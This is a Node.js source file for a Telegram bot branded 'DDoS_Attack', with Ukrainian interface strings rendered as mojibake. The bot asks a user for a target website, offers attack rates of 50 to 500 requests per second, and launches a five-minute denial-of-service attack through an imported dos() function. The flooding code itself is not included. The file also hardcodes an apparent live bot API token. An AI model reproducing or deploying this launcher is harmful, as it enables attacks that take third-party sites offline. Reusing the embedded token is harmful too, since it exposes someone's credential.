let TelegramBot = require('node-telegram-bot-api');
let TOKEN = '5147519741:AAGzpTdTYKjo3YaLgBP6BDVE5IWZcgb-QXI';
let bot = new TelegramBot(TOKEN, {
    polling: true
});

function addZeroToNumber(num) {
    if (num <= 9) {
        return '0' + num;
    } else return num;
}

let mainKeyboard = {
    "reply_markup": {
        hide_keyboard: false,
        "keyboard": [
            ["‚ôøÔ∏è –ó–∞–¥—É–¥–æ—Å–∏—Ç–∏ ‚ôøÔ∏è"]
        ]
    },
    parse_mode: 'HTML'
};
let requestsCount = {
    "reply_markup": {
        hide_keyboard: false,
        "keyboard": [
            ["‚û°Ô∏è 50"],
            ["‚û°Ô∏è 100"],
            ["‚û°Ô∏è 150"],
            ["‚û°Ô∏è 200"],
            ["‚û°Ô∏è 250"],
            ["‚û°Ô∏è 500"]
        ]
    }
};

let active_process = false;
let link = "";
const ATTACK_INTERVAL = 1000;
const urlRegex = /^(?:http(s)?:\/\/)?[\w.-]+(?:\.[\w\.-]+)+[\w\-\._~:/?#[\]@!\$&'\(\)\*\+,;=.]+$/gm;

const dos = require('./functions');

bot.on('message', (msg) => {
    const chatID = msg.chat.id;
    if (active_process) {
        bot.sendMessage(chatID, "üîÑ –ê—Ç–∞–∫–∞ –≤ –ø—Ä–æ—Ü–µ—Å—ñ, –¥–æ—á–µ–∫–∞–π—Ç–µ—Å—è –∑–∞–∫—ñ–Ω—á–µ–Ω–Ω—è...");
        return;
    }
    if (msg.text == "/start") {
        bot.sendMessage(chatID, `üá∫üá¶–î–æ–±—Ä–æ–≥–æ –¥–Ω—è!üá∫üá¶\n\n–í–∞—Å –≤—ñ—Ç–∞—î <b>DDoS_Attack</b> –±–æ—Ç ü§ñ!\n\n‚ùóÔ∏è–î–ª—è —Ç–æ–≥–æ, —â–æ–± —Ä–æ–∑–ø–æ—á–∞—Ç–∏ –∞—Ç–∞–∫—É, –æ–±–µ—Ä—ñ—Ç—å –ø—É–Ω–∫—Ç –º–µ–Ω—é <b>"‚ôøÔ∏è –ó–∞–¥—É–¥–æ—Å–∏—Ç–∏ ‚ôøÔ∏è"</b>`, mainKeyboard);
    }
    if (msg.text == "‚ôøÔ∏è –ó–∞–¥—É–¥–æ—Å–∏—Ç–∏ ‚ôøÔ∏è") {
        bot.sendMessage(chatID, "–ù–∞–¥—ñ—à–ª—ñ—Ç—å –ø–æ—Å–∏–ª–∞–Ω–Ω—è –Ω–∞ —Ä–µ—Å—É—Ä—Å", {
            reply_markup: JSON.stringify({
                remove_keyboard: true
            })
        });
    }
    if (urlRegex.test(msg.text) && !active_process) {
        link = msg.text;
        bot.sendMessage(chatID, `–ü–æ—Å–∏–ª–∞–Ω–Ω—è –Ω–∞ —Ä–µ—Å—É—Ä—Å: ${link}`, {
            disable_web_page_preview: true
        });
        bot.sendMessage(chatID, "–û–±–µ—Ä—ñ—Ç—å –∫—ñ–ª—å–∫—ñ—Å—Ç—å –∞—Ç–∞–∫ (–∑–∞–ø–∏—Ç—ñ–≤) –≤ —Å–µ–∫—É–Ω–¥—É", requestsCount);
    }
    if (/^‚û°Ô∏è/g.test(msg.text) && !active_process) {
        bot.sendMessage(chatID, `–ö—ñ–ª—å–∫—ñ—Å—Ç—å –∑–∞–ø–∏—Ç—ñ–≤: <i>${msg.text.replace("‚û°Ô∏è ", "")}</i>`, {
            parse_mode: 'HTML'
        });
        let deadline = new Date(new Date().getTime() + (60000*5));
        bot.sendMessage(chatID, `üöÄ <b>–ü–æ—á–∏–Ω–∞—é DDoS –Ω–∞ 5 —Ö–≤–∏–ª–∏–Ω</b>\n–ö—ñ–Ω–µ—Ü—å –ø—Ä–æ—Ü–µ–¥—É—Ä–∏ –≤ <i>${addZeroToNumber(deadline.getHours())}:${addZeroToNumber(deadline.getMinutes())}</i>`, {
            reply_markup: JSON.stringify({
                remove_keyboard: true
            }),
            parse_mode: 'HTML'
        });
        active_process = true;
        dos(link, parseInt(msg.text.replace("‚û°Ô∏è ", "")), ATTACK_INTERVAL, deadline, bot, chatID);
        let check_deadline = setInterval(() => {
            if (new Date().getTime() >= deadline) {
                setTimeout(() => {
                    bot.sendMessage(chatID, "‚úÖ <b>DDoS –∑–∞–≤–µ—Ä—à–µ–Ω–æ</b> ‚úÖ\n\n–î—è–∫—É—î–º–æ —â–æ –æ–±—Ä–∞–ª–∏ –Ω–∞—Å ü§ó!", mainKeyboard);
                }, 500);
                active_process = false;
                link = "";
                clearInterval(check_deadline);
            }
        }, 1000);
    }
});